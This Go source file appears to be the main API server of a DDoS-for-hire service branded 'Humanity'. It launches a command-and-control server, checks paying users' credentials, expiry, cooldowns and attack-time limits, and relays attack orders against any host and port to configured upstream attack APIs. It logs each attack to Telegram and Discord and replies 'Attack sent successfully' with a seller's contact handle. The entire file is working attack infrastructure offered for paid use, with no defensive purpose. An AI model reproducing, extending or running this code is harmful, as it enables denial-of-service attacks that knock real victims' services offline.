package main

import (
	"fmt"
	"net/http"
	"strconv"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/gofiber/fiber/v2"

	"api/core/attacks"
	b "api/core/blacklist"
	"api/core/cnc"
	"api/core/config"
	"api/core/database"
	"api/core/discord"
	"api/core/modules"
	"api/core/telegram"
	"api/core/validation"
)

func main() {
	if err := config.LoadConfig(); err != nil {
		panic(err)
	}
	fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[0mOK, Connecting to database.")
	database.Connect()
	fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[0mOK, Reading and decoding methods file.")
	modules.LoadMethods()
	fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[0mOK, Reading and decoding blacklist file.")
	fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[0mOK, Starting fiber server.")
	app := fiber.New()

	fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[0mOK, Starting C2 server")
	cnc.Start(database.Db)

	attackSlots := 0
	maxGlobalSlots := 3

	app.Get("/", func(c *fiber.Ctx) error {
		username := c.Query("username")
		password := c.Query("password")
		host := c.Query("host")
		port := c.Query("port")
		timeStr := c.Query("time")
		method := c.Query("method")
		userInfo := database.GetUserInfo(username) // fetch users' info from the database

		duration, err := strconv.Atoi(timeStr) // convert the duration to an int because it's received as a string
		if err != nil {
			return c.Status(http.StatusBadRequest).JSON(fiber.Map{
				"error":   true,
				"message": "Invalid duration. Make sure to use a valid number",
			})
		}

		if attackSlots >= maxGlobalSlots && !userInfo.SlotBypass { // are all global slots in use?
			return c.Status(http.StatusTooManyRequests).JSON(fiber.Map{
				"error":   true,
				"message": "Maximum global slots are in use",
			})
		}

		if !database.IsValidUser(username, password) { // does the user actually exist?
			return c.Status(http.StatusUnauthorized).JSON(fiber.Map{
				"error":   true,
				"message": "Invalid username or password",
			})
		}

		if username == "" {
			return c.Status(http.StatusBadRequest).JSON(fiber.Map{
				"error":   true,
				"message": "Username is required",
			})
		}

		if userInfo.Expiry < time.Now().Unix() {
			return c.Status(http.StatusUnauthorized).JSON(fiber.Map{
				"error":   true,
				"message": "User has expired",
			})
		}

		fmt.Println("\u001B[90m[\u001B[92mHumanity\u001B[90m] \u001B[1;95mDEBUG\u001B[0m, Called blacklist check!")

		if validation.IsCooldown(username, userInfo.Cooldown) { // is the user on cooldown?
			return c.Status(http.StatusTooManyRequests).JSON(fiber.Map{
				"error":   true,
				"message": "Cooldown in progress",
			})
		}

		if duration > userInfo.MaxTime && !userInfo.DurationBypass {
			return c.Status(http.StatusBadRequest).JSON(fiber.Map{
				"error":   true,
				"message": fmt.Sprintf("Attack duration exceeds your maximum allowed time of %d.", userInfo.MaxTime),
			})
		}

		if b.IsBlacklisted(host) {
			telegram.LogBlacklisted(username, host, port, strconv.Itoa(duration), method)
			return c.Status(http.StatusForbidden).JSON(fiber.Map{
				"error":   true,
				"message": "Blacklisted target!",
			})
		}

		if validation.IsValidMethod(method) && duration <= userInfo.MaxTime {
			attacks.Mutex.Lock()
			defer attacks.Mutex.Unlock()
			attacks.UserOngoingAttacks = make(map[string][]*attacks.OngoingAttack)

			if len(attacks.UserOngoingAttacks[username]) >= userInfo.Concurrents {
				return c.Status(http.StatusTooManyRequests).JSON(fiber.Map{
					"error":   true,
					"message": "You have reached your maximum concurrent limit!",
				})
			}
			validation.SetUserCooldown(username)
			attack := &attacks.OngoingAttack{
				Username:  username,
				StartTime: time.Now(),
				Duration:  time.Duration(duration) * time.Second,
			}

			attacks.GlobalOngoingAttacks = append(attacks.GlobalOngoingAttacks, attack)

			attacks.UserOngoingAttacks[username] = append(attacks.UserOngoingAttacks[username], attack)

			fmt.Printf("%s attacked %s:%s for %d seconds using %s\n",
				username, host, port, duration, method)
			apiURLs := validation.MethodConfig[method].APIs
			for _, apiURL := range apiURLs {
				apiURL = validation.Replace(apiURL, host, port, timeStr, method)
				attacks.Request(apiURL)
			}

			go func() {
				<-time.After(attack.Duration) // wait to remove the attack
				attacks.Remove(attack)        // remove the attack
			}()

			telegram.Log(username, host, port, strconv.Itoa(duration), method)
			discord.LogDiscordWebhook(username, host, port, strconv.Itoa(duration), method)

			return c.JSON(fiber.Map{
				"error":    false,
				"host":     host,
				"port":     port,
				"duration": duration,
				"method":   method,
				"message":  "Attack sent successfully",
				"contact":  "@dekurlas",
			})
		}

		return c.Status(http.StatusBadRequest).JSON(fiber.Map{
			"error":   true,
			"message": "Invalid method or time duration",
		})
	})

	err := app.Listen(config.GetConfig().Api.Host + ":" + strconv.Itoa(config.GetConfig().Api.Port))
	if err != nil {
		panic(err)
	}
}
